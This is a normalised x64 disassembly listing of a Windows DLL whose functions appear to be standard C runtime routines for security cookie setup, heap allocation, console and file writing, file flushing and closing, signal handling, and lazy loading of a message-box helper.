call [ GetCurrentProcessId@IAT ]
mov r11d eax
xor rbx r11
call [ GetCurrentThreadId@IAT ]
mov r11d eax
xor rbx r11
call [ GetTickCount@IAT ]
lea rcx [ rsp + 0x38 ]
mov r11d eax
xor rbx r11
call [ QueryPerformanceCounter@IAT ]
mov r11 [ rsp + 0x38 ]
xor r11 rbx
mov rbx [ rsp + 0x40 ]
mov rax 0xffffffffffff
and r11 rax
mov rax 0x2b992ddfa233
cmp r11 rdi
cmove r11 rax
mov [ rw-data ] r11
not r11
mov [ rw-data ] r11
add rsp 0x20
pop rdi
retn
not rax
mov [ rw-data ] rax
add rsp 0x20
pop rdi
retn
sub_18000ebd0
movsxd r8 [ rcx + 0x3c ]
xor r9d r9d
mov r10 rdx
add r8 rcx
movzx eax [ r8 + 0x14 ]
movzx r11d [ r8 + 0x6 ]
test r11d r11d
lea rcx [ rax + r8 + 0x18 ]
je r-xdata
xor eax eax
retn
mov edx [ rcx + 0xc ]
cmp r10 rdx
jb r-xdata
add r9d 0x1
add rcx 0x28
cmp r9d r11d
jb r-xdata
mov eax [ rcx + 0x8 ]
add eax edx
cmp r10 rax
jb r-xdata
mov rax rcx
retn
sub_18000ec20
sub rsp 0x28
mov r8 rcx
lea rcx [ __dos_header ]
call sub_18000eba0
test eax eax
je r-xdata
add rsp 0x28
retn
sub r8 rcx
mov rdx r8
call sub_18000ebd0
test rax rax
je r-xdata
mov eax [ rax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
jmp r-xdata
sub_18000ec90
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
test rcx rcx
mov rdi r8
mov rbx rdx
je r-xdata
imul rbx rcx
mov eax 0x1
test rbx rbx
cmove rbx rax
xor edx edx
mov rax 0xffffffffffffffe0
div rcx
cmp rax rbx
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
lea edx [ rax + 0x8 ]
mov r8 rbx
call [ HeapAlloc@IAT ]
test rax rax
jne r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0xc
call sub_180008d20
xor eax eax
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
test rdi rdi
je r-xdata
mov rcx rbx
call sub_18000c980
test eax eax
jne r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov [ rdi ] 0xc
xor eax eax
cmp rbx 0xffffffffffffffe0
ja r-xdata
test rdi rdi
je r-xdata
xor eax eax
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov [ rdi ] 0xc
sub_18000ed60
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x20
test rcx rcx
mov rbx rdx
mov rdi rcx
jne r-xdata
test rdx rdx
jne r-xdata
mov rcx rdx
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rdi
jmp sub_180007310
cmp rdx 0xffffffffffffffe0
mov [ rsp + 0x30 ] rbp
mov [ rsp + 0x38 ] rsi
ja r-xdata
call sub_1800085f0
xor eax eax
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_18000c980
call sub_180008e80
mov [ rax ] 0xc
mov ebp 0x1
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov rbp [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call sub_180008e80
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180008e30
mov [ rbx ] eax
mov rcx rbx
call sub_18000c980
test eax eax
je r-xdata
call sub_180008e80
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180008e30
mov [ rbx ] eax
jmp r-xdata
cmp rbx 0xffffffffffffffe0
jbe r-xdata
xor eax eax
mov rcx [ rw-data ]
test rbx rbx
mov r8 rdi
cmove rbx rbp
xor edx edx
mov r9 rbx
call [ HeapReAlloc@IAT ]
test rax rax
mov rsi rax
jne r-xdata
sub_18000ee50
push rbx
push rbp
push rsi
push rdi
push r13
push r14
sub rsp 0x5f8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x5e0 ] rax
xor edi edi
test r8d r8d
mov r13d r8d
mov rbp rdx
movsxd rbx ecx
mov r14d edi
mov esi edi
jne r-xdata
test rdx rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rsp + 0x648 ] r12
mov [ rsp + 0x5f0 ] r15
mov r12b bl
and r12d 0x1f
mov r15 rbx
lea rcx [ rw-data ]
sar r15 0x5
mov [ rsp + 0x50 ] r15
imul r12 r12 0x58
mov rcx [ rcx + r15 * 8 ]
mov [ rsp + 0x58 ] r12
movzx edi [ r12 + rcx + 0x38 ]
add dil dil
sar dil 0x1
cmp dil 0x2
je r-xdata
call sub_180008eb0
mov [ rax ] edi
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rdi
call sub_180008d20
or eax 0xffffffff
jmp r-xdata
mov rcx [ rsp + 0x5e0 ]
xor rcx rsp
call sub_180006970
add rsp 0x5f8
pop r14
pop r13
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov eax r13d
not eax
test al 0x1
jne r-xdata
cmp dil 0x1
jne r-xdata
test [ r12 + rcx + 0x8 ] 0x20
je r-xdata
call sub_180008eb0
xor ebx ebx
mov [ rax ] ebx
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rbx
call sub_180008d20
jmp r-xdata
mov ecx ebx
call sub_180012280
test eax eax
je r-xdata
xor edx edx
mov ecx ebx
lea r8d [ rdx + 0x2 ]
call sub_180012300
or eax 0xffffffff
lea rdx [ rw-data ]
jmp r-xdata
lea rdx [ rw-data ]
mov rax [ rdx + r15 * 8 ]
test [ r12 + rax + 0x8 ] 0x80
je r-xdata
mov rcx [ rdx + r15 * 8 ]
test [ r12 + rcx + 0x8 ] 0x80
je r-xdata
call sub_18000a690
xor ebx ebx
lea rdx [ rsp + 0x4c ]
mov rcx [ rax + 0xc0 ]
lea rax [ rw-data ]
cmp [ rcx + 0x14 ] ebx
mov rcx [ rax + r15 * 8 ]
mov rcx [ r12 + rcx ]
sete bl
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
mov rcx [ r12 + rcx ]
lea r9 [ rsp + 0x48 ]
mov r8d r13d
mov rdx rbp
mov [ rsp + 0x20 ] rsi
call [ WriteFile@IAT ]
test eax eax
je r-xdata
xor r15d r15d
test dil dil
jne r-xdata
lea rdx [ rw-data ]
test ebx ebx
je r-xdata
call [ GetLastError@IAT ]
mov r15d eax
mov r14d [ rsp + 0x48 ]
xor r15d r15d
cmp dil 0x2
jne r-xdata
test r13d r13d
mov rdi rbp
je r-xdata
call [ GetConsoleCP@IAT ]
test r13d r13d
mov [ rsp + 0x44 ] esi
mov r12d eax
mov [ rsp + 0x4c ] eax
mov rbx rbp
je r-xdata
test dil dil
je r-xdata
mov r12 [ rsp + 0x58 ]
lea rdx [ rw-data ]
cmp r15d 0x5
jne r-xdata
test r15d r15d
je r-xdata
sub r14d esi
mov eax r14d
jmp r-xdata
test r13d r13d
mov rdi rbp
je r-xdata
test r13d r13d
mov rdi rbp
je r-xdata
mov rax [ rsp + 0x50 ]
mov rax [ rdx + rax * 8 ]
test [ r12 + rax + 0x8 ] 0x40
je r-xdata
lea rbx [ rsp + 0x70 ]
xor ecx ecx
nop
nop
mov r15d [ rsp + 0x44 ]
jmp r-xdata
mov r15d [ rsp + 0x4c ]
lea rdx [ rw-data ]
jmp r-xdata
call sub_180008e80
mov [ rax ] 0x1c
call sub_180008eb0
mov [ rax ] 0x0
cmp [ rbp ] 0x1a
jne r-xdata
mov ecx r15d
call sub_180008ee0
jmp r-xdata
call sub_180008e80
mov [ rax ] 0x9
call sub_180008eb0
mov [ rax ] r15d
jmp r-xdata
mov r12 [ rsp + 0x648 ]
mov r15 [ rsp + 0x5f0 ]
nop
nop
lea rax [ rsp + 0x70 ]
mov r8d ebx
lea r9 [ rsp + 0x48 ]
sub r8d eax
mov rax [ rsp + 0x50 ]
mov [ rsp + 0x20 ] r15
mov rcx [ rdx + rax * 8 ]
lea rdx [ rsp + 0x70 ]
mov rcx [ r12 + rcx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx eax [ rdi ]
add rdi 0x1
cmp al 0xa
jne r-xdata
cmp dil 0x1
je r-xdata
mov rdx [ rsp + 0x50 ]
movzx ecx [ rbx ]
mov r8 [ rsp + 0x58 ]
xor r15d r15d
cmp cl 0xa
lea rax [ rw-data ]
mov rdx [ rax + rdx * 8 ]
sete r15b
cmp [ r8 + rdx + 0x50 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
lea rax [ rsp + 0x480 ]
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x30 ] rsi
sub ecx eax
lea r8 [ rsp + 0x480 ]
mov [ rsp + 0x28 ] 0x2ab
mov eax ecx
mov ecx 0xfde9
cdq
sub eax edx
xor edx edx
sar eax 0x1
mov r9d eax
lea rax [ rsp + 0x70 ]
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
test eax eax
mov r12d eax
je r-xdata
movzx eax [ rdi ]
add rdi 0x2
cmp ax 0xa
jne r-xdata
lea rax [ rsp + 0x70 ]
mov r8d ebx
lea r9 [ rsp + 0x48 ]
sub r8d eax
mov rax [ rsp + 0x50 ]
mov [ rsp + 0x20 ] r15
mov rcx [ rdx + rax * 8 ]
lea rdx [ rsp + 0x70 ]
mov rcx [ r12 + rcx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx eax [ rdi ]
add rdi 0x2
cmp ax 0xa
jne r-xdata
call [ GetLastError@IAT ]
mov r15d eax
jmp r-xdata
movsxd rax [ rsp + 0x48 ]
lea rcx [ rsp + 0x70 ]
sub rbx rcx
add r14d eax
cmp rax rbx
jl r-xdata
add rcx 0x1
mov [ rbx ] al
add rbx 0x1
cmp rcx 0x400
jb r-xdata
mov [ rbx ] 0xd
add rbx 0x1
add esi 0x1
add rcx 0x1
movzx eax [ rbx ]
xor r15d r15d
cmp ax 0xa
mov [ rsp + 0x40 ] ax
sete r15b
add rbx 0x2
cmp dil 0x2
jne r-xdata
movsx ecx cl
call sub_180011980
test eax eax
je r-xdata
movzx eax [ r8 + rdx + 0x4c ]
mov [ rsp + 0x61 ] cl
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x60 ] al
mov [ r8 + rdx + 0x50 ] 0x0
lea rdx [ rsp + 0x60 ]
mov r8d 0x2
call sub_180012270
cmp eax 0xffffffff
jne r-xdata
call [ GetLastError@IAT ]
mov r15d eax
jmp r-xdata
xor ebx ebx
nop
nop
nop
add rdx 0x2
mov [ rcx ] ax
add rcx 0x2
cmp rdx 0x152
jb r-xdata
mov [ rcx ] 0xd
add rcx 0x2
add rdx 0x2
call [ GetLastError@IAT ]
mov r15d eax
jmp r-xdata
movsxd rax [ rsp + 0x48 ]
lea rcx [ rsp + 0x70 ]
sub rbx rcx
add r14d eax
cmp rax rbx
jl r-xdata
add rcx 0x2
mov [ rbx ] ax
add rbx 0x2
cmp rcx 0x3ff
jb r-xdata
mov [ rbx ] 0xd
add rbx 0x2
add esi 0x2
add rcx 0x2
test r14d r14d
je r-xdata
mov eax edi
lea rdx [ rw-data ]
sub eax ebp
cmp eax r13d
jb r-xdata
mov eax edi
sub eax ebp
cmp eax r13d
jae r-xdata
movzx ecx [ rsp + 0x40 ]
call sub_180011ee0
cmp ax [ rsp + 0x40 ]
jne r-xdata
cmp dil 0x2
jne r-xdata
cmp dil 0x1
je r-xdata
lea rcx [ rsp + 0x40 ]
mov r8d 0x1
mov rdx rbx
call sub_180012270
cmp eax 0xffffffff
je r-xdata
mov rax r13
sub rax rbx
add rax rbp
cmp rax 0x1
jle r-xdata
xor eax eax
lea r8 [ rsp + 0x40 ]
mov r9d 0x1
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x60 ]
xor edx edx
mov ecx r12d
mov [ rsp + 0x28 ] 0x5
mov [ rsp + 0x20 ] rax
add rbx 0x1
call [ WideCharToMultiByte@IAT ]
test eax eax
mov r12d eax
je r-xdata
mov r15d [ rsp + 0x44 ]
jmp r-xdata
call [ GetLastError@IAT ]
cmp r12d ebx
mov r15d eax
jg r-xdata
add ebx [ rsp + 0x48 ]
cmp r12d ebx
jg r-xdata
mov eax edi
sub eax ebp
cmp eax r13d
jae r-xdata
mov eax edi
lea rdx [ rw-data ]
sub eax ebp
cmp eax r13d
jb r-xdata
mov eax edi
sub eax ebp
cmp eax r13d
jae r-xdata
jmp r-xdata
call [ GetLastError@IAT ]
mov r15d eax
jmp r-xdata
add r14d 0x1
test r15d r15d
je r-xdata
mov eax ebx
sub eax ebp
cmp eax r13d
jb r-xdata
movzx eax [ rbx ]
mov r8 [ rsp + 0x50 ]
mov rdx [ rsp + 0x58 ]
lea r9 [ rw-data ]
add r14d 0x1
mov rcx [ r9 + r8 * 8 ]
mov [ rdx + rcx + 0x4c ] al
mov rax [ r9 + r8 * 8 ]
mov [ rdx + rax + 0x50 ] 0x1
mov r15d [ rsp + 0x44 ]
jmp r-xdata
lea rcx [ rsp + 0x40 ]
mov r8d 0x2
mov rdx rbx
call sub_180012270
cmp eax 0xffffffff
je r-xdata
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
lea r9 [ rsp + 0x44 ]
mov rcx [ rcx + rax * 8 ]
mov rax [ rsp + 0x58 ]
lea rdx [ rsp + 0x60 ]
mov rcx [ rax + rcx ]
mov r8d r12d
mov [ rsp + 0x20 ] 0x0
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov r14d edi
sub r14d ebp
cmp r14d r13d
jb r-xdata
mov rax [ rsp + 0x50 ]
movsxd rcx ebx
mov r8d r12d
lea rdx [ rsp + rcx + 0x70 ]
lea rcx [ rw-data ]
lea r9 [ rsp + 0x48 ]
mov rcx [ rcx + rax * 8 ]
mov rax [ rsp + 0x58 ]
sub r8d ebx
mov rcx [ rax + rcx ]
mov [ rsp + 0x20 ] rsi
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
lea rbx [ rsp + 0x70 ]
xor ecx ecx
jmp r-xdata
mov cx 0xd
mov [ rsp + 0x40 ] 0xd
call sub_180011ee0
cmp ax [ rsp + 0x40 ]
jne r-xdata
test dil dil
jne r-xdata
mov r15d [ rsp + 0x44 ]
jmp r-xdata
add rbx 0x1
jmp r-xdata
call [ GetLastError@IAT ]
mov r15d eax
jmp r-xdata
mov r14d ebx
sub r14d ebp
add r14d esi
cmp [ rsp + 0x44 ] r12d
jl r-xdata
lea rcx [ rsp + 0x480 ]
xor edx edx
nop
nop
jmp r-xdata
call [ GetLastError@IAT ]
mov r15d eax
jmp r-xdata
add r14d 0x1
add esi 0x1
test r15d r15d
je r-xdata
mov r12d [ rsp + 0x4c ]
jmp r-xdata
mov rax [ rsp + 0x50 ]
mov [ rsp + 0x60 ] 0xd
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov rax [ rsp + 0x58 ]
lea r9 [ rsp + 0x44 ]
mov rcx [ rax + rcx ]
lea rdx [ rsp + 0x60 ]
mov r8d 0x1
mov [ rsp + 0x20 ] 0x0
call [ WriteFile@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov r15d eax
jmp r-xdata
cmp [ rsp + 0x44 ] 0x1
jl r-xdata
mov r12d [ rsp + 0x4c ]
add esi 0x1
add r14d 0x1
jmp r-xdata
sub_18000f660
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x30
mov r12d r8d
mov r13 rdx
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180008eb0
xor edi edi
mov [ rax ] edi
call sub_180008e80
mov [ rax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_180008eb0
xor edi edi
mov [ rax ] edi
call sub_180008e80
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
or eax 0xffffffff
cmp ebx [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x68 ]
add rsp 0x30
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rsi rbx
sar rsi 0x5
lea r14 [ rw-data ]
mov dil bl
and edi 0x1f
imul rdi rdi 0x58
mov rax [ r14 + rsi * 8 ]
mov cl [ rax + rdi + 0x8 ]
and ecx 0x1
jne r-xdata
mov ecx ebx
call sub_180006400
nop
mov rax [ r14 + rsi * 8 ]
test [ rax + rdi + 0x8 ] 0x1
je r-xdata
call sub_180008eb0
xor edi edi
mov [ rax ] edi
call sub_180008e80
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
or eax 0xffffffff
jmp r-xdata
call sub_180008e80
mov [ rax ] 0x9
call sub_180008eb0
xor edi edi
mov [ rax ] edi
or edi 0xffffffff
mov r8d r12d
mov rdx r13
mov ecx ebx
call sub_18000ee50
mov edi eax
jmp r-xdata
mov ecx ebx
call sub_1800064d0
mov eax edi
jmp r-xdata
sub_18000f7b0
sub rsp 0x38
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x1c ]
add rsp 0x38
retn
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
or eax 0xffffffff
add rsp 0x38
retn
sub_18000f7f0
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x30
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180008e80
mov [ rax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_180008e80
mov [ rax ] 0x9
xor edi edi
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
or eax 0xffffffff
cmp ebx [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov rsi rbx
sar rsi 0x5
lea r12 [ rw-data ]
mov dil bl
and edi 0x1f
imul rdi rdi 0x58
mov rax [ r12 + rsi * 8 ]
mov cl [ rax + rdi + 0x8 ]
and ecx 0x1
jne r-xdata
mov ecx ebx
call sub_180006400
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rdi + 0x8 ] 0x1
je r-xdata
call sub_180008e80
mov [ rax ] 0x9
xor edi edi
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
or eax 0xffffffff
jmp r-xdata
call sub_180008e80
mov [ rax ] 0x9
or edi 0xffffffff
mov ecx ebx
call sub_180006360
mov rcx rax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
xor edi edi
jmp r-xdata
call [ GetLastError@IAT ]
mov edi eax
test eax eax
je r-xdata
mov ecx ebx
call sub_1800064d0
mov eax edi
jmp r-xdata
call sub_180008eb0
mov [ rax ] edi
jmp r-xdata
sub_18000f940
mov [ rsp + 0x8 ] rbx
push rsi
sub rsp 0x30
or esi 0xffffffff
test rcx rcx
mov rbx rcx
jne r-xdata
test [ rcx + 0x18 ] 0x83
je r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rbx
mov [ rax ] 0x16
call sub_180008d20
or eax esi
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rsi
retn
mov [ rbx + 0x18 ] 0x0
mov rbx [ rsp + 0x40 ]
mov eax esi
add rsp 0x30
pop rsi
retn
call sub_1800089d0
mov rcx rbx
mov esi eax
call sub_180008990
mov rcx rbx
call sub_18000f7b0
mov ecx eax
call sub_180012480
test eax eax
jns r-xdata
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
or esi 0xffffffff
jmp r-xdata
call sub_1800085f0
mov [ rbx + 0x28 ] 0x0
sub_18000f9e0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov rbx rcx
or edi 0xffffffff
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
test [ rcx + 0x18 ] 0x40
je r-xdata
call sub_180008e80
mov [ rax ] 0x16
mov [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
mov eax edi
jmp r-xdata
call sub_180005d90
nop
mov rcx rbx
call sub_18000f940
mov edi eax
mov rcx rbx
call sub_180005e40
mov [ rcx + 0x18 ] 0x0
jmp r-xdata
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov eax edi
sub_18000fa80
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov edi 0xa
mov rcx [ rbx ]
call sub_18000a180
add rbx 0x8
sub rdi 0x1
mov [ rbx - 0x8 ] rax
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18000faf0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov ebx ecx
xor r14d r14d
mov edi r14d
mov [ rsp + 0x70 ] r14d
mov rsi r14
lea eax [ rcx - 0x2 ]
cmp eax 0x14
ja r-xdata
call sub_180008e80
mov [ rax ] 0x16
mov [ rsp + 0x20 ] r14
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
or eax 0xffffffff
cdqe
lea rcx [ __dos_header ]
movzx eax [ rcx + rax + 0xfd64 ]
mov edx [ rcx + rax * 4 + 0xfd4c ]
add rdx rcx
jmp rdx
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
call sub_18000a600
mov rsi rax
test rax rax
jne r-xdata
call sub_18000a340
mov r13 rax
jmp r-xdata
cmp r13 0x1
jne r-xdata
mov rdx [ rax + 0xa0 ]
mov rcx rdx
movsxd r8 [ rw-data ]
or eax 0xffffffff
jmp r-xdata
test r13 r13
jne r-xdata
xor eax eax
jmp r-xdata
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jae r-xdata
add rcx 0x10
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jb r-xdata
mov rbx [ rsp + 0x78 ]
mov rsi [ rsp + 0x80 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
test edi edi
je r-xdata
lea ecx [ r13 + 0x3 ]
call sub_1800097b0
int3
mov rcx r14
cmp [ rcx + 0x4 ] ebx
je r-xdata
cmp [ rcx + 0x4 ] ebx
je r-xdata
cmp ebx 0x8
je r-xdata
xor ecx ecx
call sub_180009ab0
nop
lea r12 [ rcx + 0x8 ]
mov r13 [ r12 ]
mov r15 [ rsi + 0xa8 ]
mov [ rsp + 0x38 ] r15
mov [ rsi + 0xa8 ] r14
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
mov r14d [ rsp + 0x70 ]
mov r14d [ rsi + 0xb0 ]
mov [ rsi + 0xb0 ] 0x8c
jmp r-xdata
cmp ebx 0x4
je r-xdata
call sub_18000a250
mov [ r12 ] rax
mov ecx [ rw-data ]
mov edx ecx
mov [ rsp + 0x30 ] ecx
xor r8d r8d
cmp ebx 0x8
jne r-xdata
mov r15 [ rsp + 0x38 ]
mov r14d [ rsp + 0x70 ]
jmp r-xdata
cmp ebx 0x8
jne r-xdata
xor ecx ecx
call sub_180009980
test edi edi
je r-xdata
movsxd rcx edx
add rcx rcx
mov rax [ rsi + 0xa0 ]
mov [ rax + rcx * 8 + 0x8 ] r8
add edx 0x1
mov [ rsp + 0x30 ] edx
mov ecx [ rw-data ]
jmp r-xdata
mov ecx ebx
call r13
mov edx [ rsi + 0xb0 ]
mov ecx ebx
call r13
jmp r-xdata
mov eax [ rw-data ]
add ecx eax
cmp edx ecx
jge r-xdata
mov [ rsi + 0xa8 ] r15
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
cmp ebx 0x8
je r-xdata
xor eax eax
jmp r-xdata
mov [ rsi + 0xb0 ] r14d
cmp ebx 0x4
jne r-xdata
sub_18000fde0
sub rsp 0x5a8
test [ rw-data ] 0x1
je r-xdata
call sub_18000fae0
test rax rax
je r-xdata
mov ecx 0xa
call sub_18000c5b0
test [ rw-data ] 0x2
je r-xdata
mov ecx 0x16
call sub_18000faf0
mov ecx 0x3
call sub_1800097b0
int3
lea rcx [ rsp + 0xd0 ]
call [ RtlCaptureContext@IAT ]
lea rcx [ rsp + 0x30 ]
xor edx edx
mov r8d 0x98
call sub_1800059c0
mov rax [ rsp + 0x5a8 ]
xor ecx ecx
mov [ rsp + 0x40 ] rax
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x30 ] 0x40000015
mov [ rsp + 0x20 ] rax
lea rax [ rsp + 0xd0 ]
mov [ rsp + 0x28 ] rax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x20 ]
call [ UnhandledExceptionFilter@IAT ]
sub_18000fe90
mov [ rsp + 0x10 ] rbx
push rbp
push rsi
push rdi
push r13
push r14
sub rsp 0x50
mov edi r8d
mov r13 rdx
mov r14 rcx
call sub_18000a250
xor ebx ebx
cmp [ rw-data ] rbx
mov rbp rax
mov [ rsp + 0x98 ] ebx
mov [ rsp + 0x30 ] ebx
jne r-xdata
mov rcx [ rw-data ]
mov [ rsp + 0x80 ] r12
cmp rcx rbp
je r-xdata
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
test rax rax
mov rsi rax
je r-xdata
mov rcx [ rw-data ]
cmp rcx rbp
je r-xdata
cmp [ rw-data ] rbp
je r-xdata
xor eax eax
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rcx [ rw-data ]
call sub_18000a340
mov r12 [ rsp + 0x80 ]
test rax rax
je r-xdata
call sub_18000a340
test rax rax
je r-xdata
call sub_18000a340
mov rcx [ rw-data ]
mov rsi rax
call sub_18000a340
test rsi rsi
mov r12 rax
je r-xdata
mov rcx rax
call sub_18000a180
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call sub_18000a180
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call sub_18000a180
lea rcx [ rsp + 0x98 ]
mov [ rw-data ] rax
call sub_180009500
test eax eax
je r-xdata
mov r9d edi
mov r8 r13
mov rdx r14
mov rcx rbx
call rax
jmp r-xdata
call rax
test rax rax
mov rbx rax
je r-xdata
test rax rax
je r-xdata
cmp [ rsp + 0x98 ] 0x2
jne r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rbx
call sub_180008c80
mov rbx [ rsp + 0x88 ]
add rsp 0x50
pop r14
pop r13
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rw-data ]
cmp rcx rbp
je r-xdata
call rsi
test rax rax
je r-xdata
lea rdx [ r--data ]
mov rcx rsi
call [ GetProcAddress@IAT ]
mov rcx rax
call sub_18000a180
test rax rax
mov [ rw-data ] rax
je r-xdata
call sub_18000a340
test rax rax
je r-xdata
lea rcx [ rsp + 0x30 ]
call sub_180009550
test eax eax
je r-xdata
lea rcx [ rsp + 0x34 ]
mov r9d 0xc
lea r8 [ rsp + 0x38 ]
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0xb ]
mov rcx rax
call r12
test eax eax
je r-xdata
lea rdx [ r--data ]
mov rcx rsi
call [ GetProcAddress@IAT ]
mov rcx rax
call sub_18000a180
mov [ rw-data ] rax
mov rcx rbx
call rax
mov rbx rax
cmp [ rsp + 0x30 ] 0x4
jb r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rbx
call sub_180008c80
test [ rsp + 0x40 ] 0x1
jne r-xdata
bts edi 0x12
jmp r-xdata
bts edi 0x15
jmp r-xdata
sub_1800100f0
sub rsp 0x38
test rcx rcx
mov r9 rcx
je r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
mov eax 0x16
add rsp 0x38
retn
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
cmp [ rcx ] 0x0
je r-xdata
mov [ rcx ] r8b
test rdx rdx
jne r-xdata
add rcx 0x1
sub rdx 0x1
jne r-xdata
movzx eax [ r8 ]
add rcx 0x1
add r8 0x1
test al al
mov [ rcx - 0x1 ] al
je r-xdata
mov [ r9 ] dl
jmp r-xdata
test rdx rdx
jne r-xdata
sub rdx 0x1
jne r-xdata
